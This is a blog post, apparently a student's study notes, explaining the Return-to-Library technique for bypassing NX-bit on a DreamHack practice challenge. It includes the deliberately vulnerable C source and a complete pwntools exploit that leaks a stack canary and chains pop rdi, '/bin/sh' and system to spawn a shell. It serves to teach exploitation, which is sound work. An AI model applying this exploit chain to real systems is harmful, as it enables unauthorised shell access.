---
title: "[PWNABLE] RTL"
description: "※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ # Due to the exam period, I was unable to create original examples for some of the recently posted articles. # From the next practical session onward, I will create original examples and proceed. RTL Return to Library is a technique used to bypass NX-bit, which is one of the memory protection methods."
date: "2023-10-22"
translation_key: "tistory-fb026a46c243"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-RTL"
private: false
---

**※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections.** **※**

**\# Due to the exam period, I was unable to create original examples for some of the recently posted articles.**

**\# From the next practical session, I will create examples myself and proceed.**

### RTL

Return to Library is an attack technique used to bypass NX-bit, one of the memory protection techniques.

We will proceed with this technique using a problem from DreamHack.

![](/assets/images/tistory/tistory-fb026a46c243/001.png)

Looking at the protection technique, we can see that NX-bit is enabled.

![](/assets/images/tistory/tistory-fb026a46c243/002.png)

This is the view of permissions checked using gdb's vmmap.

We can see that the stack does not have execution rights due to the NX-bit.

Therefore, using byte code such as Shellcode is almost impossible.

To bypass this, we will use the code area of the library, which is one of the areas that still have execution rights.

Shared libraries contain functions such as system and execve that can execute shells, so if we can use these functions with /bin/sh as an argument, we can obtain a shell.

```
#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

Looking at the problem code, there is a vulnerability that allows bypassing canary.

Also, the string /bin/sh exists in the code.

Using this part, we can use it as an argument for the system function.

Since the system function requires one argument, we will use the pop rdi gadget, and then return from the system function.

More

#### What is a gadget?

Generally, it refers to a "code snippet."

At first glance, this might sound confusing.

I will explain using the ret gadget as an example.

The ret gadget is literally a code snippet used to execute the ret command.

![](/assets/images/tistory/tistory-fb026a46c243/003.png)

The above image shows the end part of the main function.

Functions that exit the main function use the assembly instruction ret when returning.

At this time, the address of ret, 0x4012ce, can be a ret gadget.

When we disassemble, there will be code snippets such as pop rdi, rsi, ret, and these parts are referred to as "**gadgets**."

First, we will perform the canary leak discussed in the canary section.

Then, we will construct the payload by inserting pr + binsh + system in that order.

![](/assets/images/tistory/tistory-fb026a46c243/004.png)

We can use the gadget at 0x400853, which is pop rdi; ret;.

```
from pwn import*

p = remote('host3.dreamhack.games',19862)
#p = process('./rtl')
e = ELF('./rtl')

#context.log_level='debug'

payload =  b'A'*0x39

p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

cny = u64(b'\x00'+p.recvn(7))
print("canary : ", hex(cny))

system_add = e.sym['system']
binsh_add = next(e.search(b'/bin/sh'))
p_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b''
payload += b'a'*0x38
payload += p64(cny)
payload += b'a'*0x8
payload += p64(ret)
payload += p64(p_rdi)
payload += p64(binsh_add)
payload += p64(system_add)

p.sendafter(b"Buf: ", payload)

p.interactive()
```